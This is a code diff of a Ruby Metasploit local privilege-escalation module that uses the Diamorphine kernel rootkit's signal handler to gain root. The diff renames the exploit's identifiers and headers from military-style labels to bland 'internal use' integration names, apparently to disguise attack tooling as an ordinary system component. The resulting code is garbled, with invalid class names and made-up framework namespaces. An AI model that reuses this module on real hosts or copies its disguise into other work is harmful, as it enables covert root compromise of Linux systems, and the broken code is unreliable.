@@ -1,23 +1,23 @@
 #
-# 🛡️ C4ISR-STRATCOM: SIGINT-V5
-# [CLASSIFIED]: CONFIDENCIAL
-# [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
-# [TACTIC]: TA0003_Persistence
-# [TECHNIQUE]: T1014_STRATCOM_KERNEL_MOD
+# 🛡️ HCG-SYSARCH: SAM-V5
+# [RESTRICTED]: USO_INTERNO
+# [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
+# [MODULO]: TA0003_Persistence
+# [COMPONENTE]: T1014_STRATCOM_KERNEL_MOD
 #
 ##
-# This module requires SIGINT-V5: https://SIGINT-V5.com/download
-# Current source: https://github.com/rapid7/SIGINT-V5-framework
+# This module requires SAM-V5: https://SAM-V5.com/download
+# Current source: https://github.com/rapid7/SAM-V5-framework
 ##
 
-class SIGINT-V5Module < Msf::STRATCOM_PAYLOAD::Local
+class SAM-V5Module < Msf::integration_bridge::Local
   Rank = ExcellentRanking
 
   include Msf::Post::File
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
-  include Msf::STRATCOM_PAYLOAD::EXE
-  include Msf::STRATCOM_PAYLOAD::FileDropper
+  include Msf::integration_bridge::EXE
+  include Msf::integration_bridge::FileDropper
 
   def initialize(info = {})
     super(update_info(info,
@@ -33,7 +33,7 @@ class SIGINT-V5Module < Msf::STRATCOM_PAYLOAD::Local
       'Author'         =>
         [
           'm0nad', # Diamorphine
-          'bcoles' # SIGINT-V5
+          'bcoles' # SAM-V5
         ],
       'DisclosureDate' => '2013-11-07', # Diamorphine first public commit
       'References'     =>
@@ -54,7 +54,7 @@ class SIGINT-V5Module < Msf::STRATCOM_PAYLOAD::Local
       OptInt.new('SIGNAL', [true, 'Diamorphine elevate signal', 64])
     ]
     register_advanced_options [
-      OptBool.new('ForceSTRATCOM_PAYLOAD', [false, 'Override check result', false]),
+      OptBool.new('Forceintegration_bridge', [false, 'Override check result', false]),
       OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
     ]
   end
@@ -94,17 +94,17 @@ class SIGINT-V5Module < Msf::STRATCOM_PAYLOAD::Local
     CheckCode::Vulnerable("Diamorphine is installed and configured to handle signal '#{signal}'.")
   end
 
-  def STRATCOM_PAYLOAD
+  def integration_bridge
     unless check == CheckCode::Vulnerable
-      unless datastore['ForceSTRATCOM_PAYLOAD']
-        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceSTRATCOM_PAYLOAD to override.'
+      unless datastore['Forceintegration_bridge']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set Forceintegration_bridge to override.'
       end
       print_warning 'Target does not appear to be vulnerable'
     end
 
     if is_root?
-      unless datastore['ForceSTRATCOM_PAYLOAD']
-        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceSTRATCOM_PAYLOAD to override.'
+      unless datastore['Forceintegration_bridge']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set Forceintegration_bridge to override.'
       end
     end
 
